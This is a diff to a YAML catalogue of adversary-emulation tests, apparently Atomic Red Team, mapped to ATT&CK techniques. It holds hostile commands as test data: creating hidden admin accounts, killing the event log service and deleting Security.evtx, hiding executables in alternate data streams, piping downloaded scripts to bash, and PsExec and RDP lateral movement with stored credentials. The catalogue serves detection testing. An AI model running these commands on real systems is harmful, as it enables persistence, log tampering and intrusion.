@@ -11955,14 +11955,38 @@ persistence:
           type: String
           default: BetterWithButter
       executor:
-        command: "useradd -g 0 -M -d /root -s /bin/bash #{username}\nif [ $(cat /etc/os-release
-          | grep -i 'Name=\"ubuntu\"') ]; then echo \"#{username}:#{password}\" |
-          sudo chpasswd; else echo \"#{password}\" | passwd --stdin #{username}; fi;
-          \     \n"
+        command: |
+          useradd -g 0 -M -d /root -s /bin/bash #{username}
+          if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then echo "#{username}:#{password}" | sudo chpasswd; else echo "#{password}" | passwd --stdin #{username}; fi;
         cleanup_command: 'userdel #{username}
 
 '
         name: bash
+        elevation_required: true
+    - name: Create a new Windows admin user
+      auto_generated_guid: fda74566-a604-4581-a4cc-fbbe21d66559
+      description: 'Creates a new admin user in a command prompt.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        username:
+          description: Username of the user to create
+          type: String
+          default: T1136.001_Admin
+        password:
+          description: Password of the user to create
+          type: String
+          default: T1136_pass
+      executor:
+        command: |
+          net user /add "#{username}" "#{password}"
+          net localgroup administrators "#{username}" /add
+        cleanup_command: 'net user /del "#{username}" >nul 2>&1
+
+'
+        name: command_prompt
         elevation_required: true
   T1078.003:
     technique:
@@ -21240,24 +21264,6 @@ defense-evasion:
 '
         name: command_prompt
         elevation_required: true
-    - name: Delete System Logs Using PowerShell
-      auto_generated_guid: 334c36ca-fec3-47ff-afdb-22b2ae6d0812
-      description: |
-        Recommended Detection: Monitor for use of the windows event log filepath in PowerShell couple with delete arguments.
-        Upon execution, open the Security.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty or has very few logs in it.
-        When this service gets stopped, it is automatically restarted and the Security.evtx file re-created.
-      supported_platforms:
-      - windows
-      executor:
-        command: |
-          $eventLogId = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'EventLog'" | Select-Object -ExpandProperty ProcessId
-          Stop-Process -Id $eventLogId -Force
-          Remove-Item C:\Windows\System32\winevt\Logs\Security.evtx
-        cleanup_command: 'Start-Service -Name EventLog
-
-'
-        name: powershell
-        elevation_required: true
     - name: Delete System Logs Using Clear-EventLogId
       auto_generated_guid: b13e9306-3351-4b4b-a6e8-477358b0b498
       description: |
@@ -27094,17 +27100,15 @@ defense-evasion:
           type: path
           default: c:\ADS\
       executor:
-        command: |
-          type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
-          extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
-          findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
-          certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
-          makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
-          print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
-          reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
-          regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
-          expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
-          esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o
+        command: "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32
+          #{path}\\procexp.cab #{path}\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump
+          #{path}\\procexp.exe > #{path}\\file.txt:procexp.exe\ncertutil.exe -urlcache
+          -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1
+          c:\\temp:ttt\nmakecab #{path}\\autoruns.exe #{path}\\cabtest.txt:autoruns.cab\nprint
+          /D:#{path}\\file.txt:autoruns.exe #{path}\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg
+          #{path}\\file.txt:evilreg.reg\nregedit /E #{path}\\file.txt:regfile.reg
+          HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat #{path}\\file.txt:file.bat\nesentutl.exe
+          /y #{path}\\autoruns.exe /d #{path}\\file.txt:autoruns.exe /o \n"
         name: command_prompt
         elevation_required: true
     - name: Store file in Alternate Data Stream (ADS)
@@ -38742,8 +38746,8 @@ execution:
       - linux
       executor:
         command: |
-          curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/echo-art-fish.sh | bash
-          wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/echo-art-fish.sh | bash
+          curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
+          wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
         cleanup_command: 'rm /tmp/art-fish.txt
 
 '
@@ -40667,7 +40671,7 @@ execution:
           New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
           Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
       executor:
-        command: '#{psexec_exe} \\#{remote_host} "C:\Windows\System32\calc.exe"
+        command: '#{psexec_exe} \\#{remote_host} -accepteula "C:\Windows\System32\calc.exe"
 
 '
         name: powershell
@@ -42008,8 +42012,7 @@ lateral-movement:
         elevation_required: true
     - name: RDPto-DomainController
       auto_generated_guid: 355d4632-8cb9-449d-91ce-b566d0253d3e
-      description: 'Attempt an RDP session via "Connect-RDP" to a system. Default
-        RDPs to (%logonserver%) as the current user
+      description: 'Attempt an RDP session via Remote Desktop Application to a DomainController.
 
 '
       supported_platforms:
@@ -42019,10 +42022,18 @@ lateral-movement:
           description: ComputerName argument default %logonserver%
           type: String
           default: $ENV:logonserver.TrimStart("\")
-        username:
-          description: Username argument default %USERDOMAIN%\%username%
+        domain:
+          description: domain argument default %USERDOMAIN%
           type: String
-          default: "$Env:USERDOMAIN\\$ENV:USERNAME"
+          default: "$Env:USERDOMAIN"
+        username:
+          description: Username argument default %username%
+          type: String
+          default: "$ENV:USERNAME"
+        password:
+          description: Password
+          type: String
+          default: 1password2!
       dependencies:
       - description: Computer must be domain joined
         prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
@@ -42030,9 +42041,48 @@ lateral-movement:
         get_prereq_command: Write-Host Joining this computer to a domain must be done
           manually
       executor:
-        command: 'Connect-RDP -ComputerName #{logonserver} -User #{username}
+        command: |
+          $Server=#{logonserver}
+          $User = Join-Path #{domain} #{username}
+          $Password="#{password}"
+          cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
+          mstsc /v:$Server
+          echo "RDP connection established"
+        cleanup_command: |
+          $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
+          if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
+        name: powershell
+    - name: RDP to Server
+      auto_generated_guid: 7382a43e-f19c-46be-8f09-5c63af7d3e2b
+      description: 'Attempt an RDP session via Remote Desktop Application over Powershell
 
 '
+      supported_platforms:
+      - windows
+      input_arguments:
+        logonserver:
+          description: ComputerName
+          type: String
+          default: WIN-DC
+        username:
+          description: Username
+          type: String
+          default: Administrator
+        password:
+          description: Password
+          type: String
+          default: 1password2!
+      executor:
+        command: |
+          $Server="#{logonserver}"
+          $User="#{username}"
+          $Password="#{password}"
+          cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
+          mstsc /v:$Server
+          echo "RDP connection established"
+        cleanup_command: |
+          $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
+          if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
         name: powershell
   T1563:
     technique:
@@ -42341,7 +42391,7 @@ lateral-movement:
           type: String
           default: "\\\\localhost"
       executor:
-        command: 'psexec.exe #{remote_host} -c #{command_path}
+        command: 'psexec.exe #{remote_host} -accepteula -c #{command_path}
 
 '
         name: command_prompt
@@ -42959,8 +43009,8 @@ lateral-movement:
           New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
           Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
       executor:
-        command: "#{psexec_exe} \\\\#{computer_name} -u #{user_name} -p #{password}
-          -s cmd.exe\n"
+        command: "#{psexec_exe} \\\\#{computer_name} -accepteula -u #{user_name} -p
+          #{password} -s cmd.exe\n"
         name: command_prompt
     - name: Invoke-Command
       auto_generated_guid: 5295bd61-bd7e-4744-9d52-85962a4cf2d6
